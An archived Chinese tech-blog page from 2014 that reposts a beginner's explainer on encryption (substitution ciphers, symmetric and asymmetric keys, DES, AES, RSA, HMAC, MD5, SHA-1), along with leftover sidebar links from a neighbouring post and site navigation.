<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13419.html" target="_blank">传 iOS 7 采用扁平化设计：颠覆拟物理念</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13418.html" target="_blank">创业失败后如何找工作</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13416.html" target="_blank">程序员的时间都去了哪儿？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13413.html" target="_blank">互联网 DBA 需要做那些事</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13412.html" target="_blank">Google 眼镜的核心代码</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13411.html" target="_blank">谷歌眼镜已被越狱：或削弱谷歌对用户的控制</a></li>
</ul>
<p>热门内容</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/it/2013/0107/11895.html" title="2013年1月编程语言排行榜" target="_blank">2013年1月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0427/13409.html" title="Ubuntu 13.04 正式版发布" target="_blank">Ubuntu 13.04 正式版发布</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2011/1118/9311.html" title="百度地图推出卫星地图" target="_blank">百度地图推出卫星地图</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2009/0408/14.html" title="十天学会PHP和MYSQL视频教程篇" target="_blank">十天学会PHP和MYSQL视频教程篇</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0426/13402.html" title="如何做一个真正牛X 的开源项目" target="_blank">如何做一个真正牛X 的开源项目</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0408/13335.html" title="2013年4月编程语言排行榜" target="_blank">2013年4月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2010/0514/4515.html" title="使用方正字体侵权索赔过亿" target="_blank">使用方正字体侵权索赔过亿</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" title="如何组织大型JavaScript应用中的代码？" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
</ul>
<p><strong>热点推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0610/4712.html" title="教你如何成为PHP高手?" target="_blank">教你如何成为PHP高手?</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0114/309.html" title="PHP导入导出Excel方法" target="_blank">PHP导入导出Excel方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2011/0406/7873.html" title="Redis 的安装配置介绍" target="_blank">Redis 的安装配置介绍</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0830/3245.html" title="数据库三范式，轻松理解" target="_blank">数据库三范式，轻松理解</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0905/3268.html" title="PHP网站开发方案（开发新人必读）" target="_blank">PHP网站开发方案（开发新人必读）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0930/3362.html" title="PHP面向对象编程专题（附视频教程）" target="_blank">PHP面向对象编程专题（附视频教程）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/1101/6727.html" title="php中使用exec,system等函数调用系统命令" target="_blank">php中使用exec,system等函数调用系</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0830/5346.html" title="SVN入门及配置使用" target="_blank">SVN入门及配置使用</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0721/3087.html" title="php excel类 ，phpExcel使用方法介绍" target="_blank">php excel类 ，phpExcel使用方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0826/5308.html" title="完美解决failed to open stream: HTTP request failed!" target="_blank">完美解决failed to open stream</a>
<strong>广告赞助商</strong> <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">投放</a></li>
</ul>
<p><strong>最新视频推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/html/jiaocheng/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0422/9129.html" target="_blank">［第77讲］新浪微博开放平台 -新</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0415/9128.html" target="_blank">［第76讲］微信公共平台 - 平台</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0407/9127.html" target="_blank">［第75讲］微信公共平台 - 开放</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9125.html" target="_blank">［第74讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9124.html" target="_blank">［第73讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9123.html" target="_blank">［第72讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9122.html" target="_blank">［第71讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9121.html" target="_blank">［第70讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9120.html" target="_blank">［第69讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9119.html" target="_blank">［第68讲］thinkphp 3.1.2 系列</a>
-
<a href="http://www.php100.com/cms/com/" target="_blank">关于我们</a> | <a href="http://www.php100.com/cms/com/buddy.php" target="_blank">管理团队</a> | <a href="">网站律师</a> | <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">广告服务</a> | <a href="http://www.php100.com/cms/com/intome.php" target="_blank">投稿指南</a> | <a href="http://bbs.php100.com/thread-htm-fid-14.html" target="_blank">提建议</a> | <a href="http://www.php100.com/plus/flink.php" target="_blank">友情链接</a> | <a href="http://www.php100.com/plus/flink_add.php" target="_blank">申请加入</a> | <a href="http://www.php100.com/data/sitemap.html" target="_blank">网站地图</a></li>
</ul>
<p>Copyright (C) 2007-2011 PHP100.com, All Rights Reserved 版权所有 <a href="http://php100.com/go.php?url=http://www.php100.net/" target="_blank">上海创恩信息技术有限公司</a>. 沪ICP备08100465号
地址:上海徐汇区零陵路585号 爱邦大厦26H座 传真(FAX):021-61190281 电话(Tel):021-61190282
PHP100 Website Powered by PHPCMS. For PHP100. 服务器维护：阿里巴巴-阿里云</p>
<p><a href="http://www.cnzz.com/stat/website.php?web_id=1668579" title="站长统计" target="_blank">站长统计</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/SQL注入/">SQL注入</a></li></span></span> | <span class="tags">Tagged <a href="/tags/SQL注入/" class="label label-primary">SQL注入</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-加解密--加密算法你了解多少/">加密算法你了解多少</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-加解密--加密算法你了解多少/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">加密算法你了解多少</h1>
<p>（转自：<a href="http://www.hackhp.com/post-730.html" target="_blank"><a href="http://www.hackhp.com/post-730.html">http://www.hackhp.com/post-730.html</a></a> hackhp）</p>
<p>加密算法：
当不同的远程网络通过Internet连接时，网络之间直接通过私有地址进行互访只是需求之一，除此之外，还有个非常重要的需求，那就是数据安全。
所以在穿越Internet的远程之间只实现隧道传输还不够，还必须让数据包加密传输，以保证数据在Internet传输时的安全性。
基于上述原因，在远程网络之间布置VPN除了实现隧道功能之外，还必须在隧道中实现对数据的加密，隧道与加密是VPN不得不同时实现的功能，两者缺一不可，否则就不算是完整的VPN。</p>
<p>目前，加密算法多种多样，加密算法分加密和解密两个过程。
加密是指将明文(直接可以看的懂的)数据换算成密文(无法直接看懂的)数据。
加密算法非常多，曾经最古老，最常用，也是最让人理解的就是替换法</p>
<p>例如：
发送一串文字ABCDEF，要将这些文字变为密文，就将A替换为C，将B替换为D，将C替换为E，将D替换为F，将E替换为G，将F替换为H，最后ABCDEF就使用CDEFGH，而ABCDEF才是明文，是真正的内容，而CDEFGH就是加密后的密文，并不是真正的内容，从加密过程可以看出，明文“ABCDEF”通过将每个字母替换成后面第二个字母的方法被加密城了“CDEFGH”，在这里，将每个字母替换成后面第二个字母的方法可以称为加密方法，也成为加密算法，当内容被加密之后，接收者还必须先将密文解密，才能看懂内容，这里就将密文“CDEFGH”的每个字母替换成前面第二个字母，便得到明文“ABCDEF”。</p>
<p>从上面加密与解密的整个过程中可以发现，对数据进行加密需要使用加密算法，上例中使用的加密算法就是字母替换发，即将每个字母替换成其他字母的方法，知道数据使用什么算法去解密并没关系，</p>
<p>一个人知道数据的加密算法，并不能将密文转变为明文，要对密文进行解密，不仅要知道加密算法，同时还必须知道加密的密钥，也就是密码，在上例中，将每个字谜替换成后面第二个字母就是密钥(密码)，如果别人只是知道我们使用的加密算法是字母替换发，但他不知道每个字母具体被替换成了哪个字母，是没办法将密文还原的，所以对数据加密的算法可以被公开，但是机密的密钥一定要保密不能被窃取，否则密文也就变得不安全了，因此，如何保证密钥的安全是相当重要的。</p>
<p>在对称加密算法中，因为解密时使用的密钥与加密时使用是同一个密钥，所以对密钥的保护必须格外的小心，只要密钥在交换或协商时被人窃取，数据就会被破解，显然双方必须使用绝对的方法来交换密钥。</p>
<p>而在非对称加密算法中，因为解密时使用的密钥和加密时使用的密钥不同，任何拥有弓腰的人，都可以对数据进行加密，但只有拥有私钥的人，才能对密文解密，所以公钥可以被公开，可以被任何人知道，只知道公钥只能加密，却不能解密，所以只要保证私钥掌握在自己手中不传递不外泄，就不会有问题；双方在需要加密传输时，各自都把公钥发出去，让对方通过该公钥将数据加密后发给自己，这样就能使任何人都能向自己发送加密数据，但只有自己才能对数据解密。</p>
<p><strong>对称加密算法(私钥算法)</strong></p>
<p><strong>DES(Data Encryption Standard)</strong>
DES加密共有三种形式，分为DWS(40-bit长度加密)，DES(56-bit长度加密)以及3DES(3倍的56-bit长度加密，即168-bit长度加密)；由于3DES加密长度够长，安全性够高，所以推荐使用3DES。</p>
<p><strong>AES(Advanced Encryption Standard)</strong>
AES加密共有三种形式，分为AES 128 (128-bit长度加密)，AES 192 (192-bit长度加密)以及AES 256 (256-bit长度加密)；由于AES 256加密长度够长，安全性够高，所以推荐使用AES 256。</p>
<p><strong>非对称加密算法(公钥算法)</strong></p>
<p><strong>RSA</strong>
RSA公钥加密算法的名字是发明者的人名：Rivest,Shamir and Adleman，该算法的长度位数不定，由人手工定义。</p>
<p>在硬件方面，当采用公钥加密算法时，速度明显慢于私钥加密算法，虽然使用公钥加密算法似乎更安全，但通常都使用私钥加密算法，而使用私钥加密算法的终点就是要保证密钥的安全传递与交换，所以该工作就由公钥加密算法来完成，最后的过程就是先使用公钥加密算法安全的交换私钥算法的密钥后，然后再使用私钥算法对数据进行加密，这样即保证了私钥算法的密钥安全，同时又获得了数据加密的速度，两者兼得。</p>
<p><strong>HMAC(Hashed Message Authentication Code)</strong>
当数据在传输过程，如果被劫持后修改了数据，通常数据接受者很难发现数据是否在途中被篡改；在正常的数据传输中大家应该知道，每个数据包都会在后面写上一个数据计算后的校验和(Checksum)，当数据计算出校验和之后，接受者在收到数据后也需要对数据进行校验和计算，如果发现自己计算的校验和与数据包附带的校验和不同，便认为数据发生了偏移和错误，因此将数据包丢弃和要求重传，在需要保证数据安全中途被篡改时，也引用了校验和的思想，数据在发送之前先计算出相应的Hash值，当接收者收到数据后也要对数据计算Hash值，如果发现自己计算的Hash值与数据附带的值不匹配，便认为数据在传输过程中遭到了篡改，从而拒绝不正确的数据包。</p>
<p>在这里，Hash算法和校验和算法基本上是相同的，Hash算法的特征在于任何大小的数据计算出的Hash值的长度都是一样的，任何数据通过Hash计算后，得到的Hash值都是固定长度的，哪怕几个字的数据，或者是几GByte的数据，计算出的Hash值的长度都是相同的，所以如果仅仅是根据Hash值，是无法推算出数据内容的，只靠Hash值无法想数据内容还原。基于以上Hash的特征，所以Hash多用于认证，认证对等双方相互认证时，只需要交换密码的Hash值即可，而无须交换密码，从而防止了密码被窃取，但仅仅是窃取Hash值，也无法推算出密码是多少。</p>
<p><strong>MD5(Message Digest 5)</strong>
将任何数据通过计算后输出128-bit长度的Hash值。</p>
<p><strong>SHA-1(Secure Hash Algorithm 1)</strong>
<strong>160-bit digest</strong>
将任何数据通过计算后输出160-bit长度的Hash值。
来源： <a href="[http://www.hackhp.com/post-730.html](http://www.hackhp.com/post-730.html)">[http://www.hackhp.com/post-730.html](http://www.hackhp.com/post-730.html)</a> </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/加解密/">加解密</a></li></span></span> | <span class="tags">Tagged <a href="/tags/加解密/" class="label label-primary">加解密</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-加解密--加密算法你了解多少/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-加解密--加密算法你了解多少" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/84/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/82/">82</a></li><li><a class="page-number" href="/page/83/">83</a></li><li><a class="page-number" href="/page/84/">84</a></li><li class="active"><li><span class="page-number current">85</span></li><li><a class="page-number" href="/page/86/">86</a></li><li><a class="page-number" href="/page/87/">87</a></li><li><a class="page-number" href="/page/88/">88</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/86/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-15 16:01:37</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
